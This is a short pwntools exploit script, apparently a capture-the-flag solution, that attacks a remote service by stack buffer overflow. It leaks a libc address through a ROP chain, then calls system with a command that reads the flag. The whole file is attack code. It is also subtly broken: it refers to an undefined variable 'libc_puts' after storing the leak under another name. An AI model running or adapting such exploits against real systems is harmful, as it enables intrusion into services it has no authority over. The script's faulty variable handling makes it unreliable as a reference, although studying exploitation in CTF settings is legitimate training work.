import pwn

#p = pwn.process("./ret2libc")
#p = pwn.gdb.debug("./ret2libc")
p = pwn.remote("107.178.209.165",1337)

rop = pwn.ROP("./ret2libc")
main_elf = pwn.ELF("./ret2libc")
distance = 40
main = main_elf.symbols['_start']
pop_rdi = rop.find_gadget(['pop rdi','ret']).address

# leak libc through __libc_start_main
p.recvuntil("your name\n")
p.sendline(b"A"*distance + pwn.p64(pop_rdi) + pwn.p64(main_elf.symbols['__libc_start_main']) + pwn.p64(main_elf.symbols['puts']) +pwn.p64(main))
# read buffer
p.recvuntil(b"A"*40)
p.readline()
# calculate libc
libc_start_main = p.readline()[:6] + b"\x00\x00"
print(libc_puts)
libc_start_main = pwn.u64(libc_start_main)
elf = pwn.ELF("./libc.so.6")
pwn.log.info("LIBC PUTS : " + hex(libc_puts))
libc = libc_puts - elf.symbols['__libc_start_main']
pwn.log.info("LIBC: " + hex(libc))

bin_sh = libc + next(elf.search(b"/bin/sh"))
system = libc + elf.symbols['system']

# pop rdx; ret;
pop_rdx = libc + 0x00001b96
# mov rdi, rsp; call rdx
mov_rdi_rsp = libc + 0x0015c2fe

pwn.log.info("BIN SH: " + hex(bin_sh))
pwn.log.info("SYSTEM: " + hex(system))
# rop chain
rop_chain = pwn.p64(pop_rdx) + pwn.p64(system) + pwn.p64(mov_rdi_rsp) + b"cat flag.txt"
p.sendline(b"A"*distance + rop_chain)
p.interactive()
